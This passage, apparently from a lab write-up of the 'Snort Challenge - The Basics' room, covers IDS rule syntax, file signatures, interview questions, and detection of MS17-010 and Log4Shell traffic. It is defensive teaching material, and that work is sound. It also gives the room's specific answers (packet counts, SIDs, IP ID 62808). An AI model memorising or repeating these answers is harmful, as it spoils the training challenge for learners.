| `flags` | Match TCP flags (`S`, `PA`, ...) |
| `dsize` | Match payload/data size |
| `sameip` | Source IP equals destination IP |

### File-signature reference

| File | Signature |
|---|---|
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF87a | `47 49 46 38 37 61` |
| GIF89a | `47 49 46 38 39 61` |

---

## Interview Questions

| Question | Answer |
|---|---|
| **Q1. What is Snort and how is it used in this room?** | An open-source NIDS/NIPS; here it runs as an IDS reading PCAPs offline and alerting when packets match rules. |
| **Q2. What is the difference between IDS and IPS?** | IDS detects and alerts (passive); IPS can also actively block traffic (active). |
| **Q3. What is the structure of a Snort rule?** | `action protocol src_ip src_port direction dst_ip dst_port (options)`. |
| **Q4. When do you use `->` vs `<>`?** | `->` for one direction, `<>` when traffic must match in either direction (e.g. "from or to port 80"). |
| **Q5. How do you detect a file type regardless of filename?** | Match its magic bytes with hex `content`, e.g. `content:"\|89 50 4E 47 0D 0A 1A 0A\|";` for PNG. |
| **Q6. What is the difference between a syntax error and a logical error?** | Syntax = Snort can't parse the rule; logical = it parses but detects the wrong thing (e.g. `get` vs `GET`, fixed with `nocase`). |
| **Q7. What does `content` do and how are raw bytes written?** | Searches the payload for a string; raw bytes are written in hex inside pipes, e.g. `\|47 45 54\|` = `GET`. |
| **Q8. What is `IPC$` and why does it matter for MS17-010?** | A Windows administrative SMB share; the requested path `\\192.168.116.138\IPC$` on TCP/445 is a key exploit indicator. |
| **Q9. What is Log4Shell and how was it detected here?** | CVE-2021-44228 in Log4j; detected with external rules (SIDs 21003726–21003729) and investigated via a `dsize` filter and Base64 decoding. |
| **Q10. Why bump `rev` after editing a rule?** | The `sid` stays (same rule) while `rev` records the new version for change tracking. |
| **Q11. Why is packet count not the same as alert count?** | A rule only alerts on packets that match its conditions; one exploit can also span many packets. |
| **Q12. Is Base64 a security control?** | No — it is reversible encoding, not encryption; anyone can decode it. |

## Final Takeaway

The **Snort Challenge - The Basics** turns **IDS** theory into muscle memory: you build a Snort rule from its `action protocol src_ip src_port direction dst_ip dst_port (options)` header, run it against a **PCAP** with `sudo snort -c local.rules -r <pcap> -A console`, and then investigate the alerts. The room climbs a clear ladder of specificity — from **port**-based detection (**HTTP** on TCP/80 → 164 packets, **FTP** on TCP/21 → 307 packets) to **content**-based detection (`content:"530"`, `content:"Administrator"`) to **file-signature** detection (**PNG** `89 50 4E 47 0D 0A 1A 0A`, **GIF89a**, **BitTorrent** `application/x-bittorrent`). Task 6 hammers home the difference between **syntax errors** (spacing, `msg:"...";`, `:` vs `;`, the non-existent `<-`, duplicate `sid`) and **logical errors** (case-sensitivity fixed with **`nocase`**, a missing **`msg`**). Tasks 7 and 8 promote you to using **external rules** to detect real exploits — **MS17-010** (SMBv1 over TCP/445, requested path `\\192.168.116.138\IPC$`, **CVSS v2 9.3**) and **Log4Shell** (CVE-2021-44228, SIDs 21003726–21003729, a `dsize:770<>855` filter, **Base64** payloads, IP ID 62808, **CVSS v2 9.3**) — while the rule-structure practice cements the non-payload options `id`, `flags`, `dsize` and `sameip` and the discipline of bumping **`rev`** on every change. The throughline: **a good rule answers a specific security question, and the alert is only the start of the investigation.**
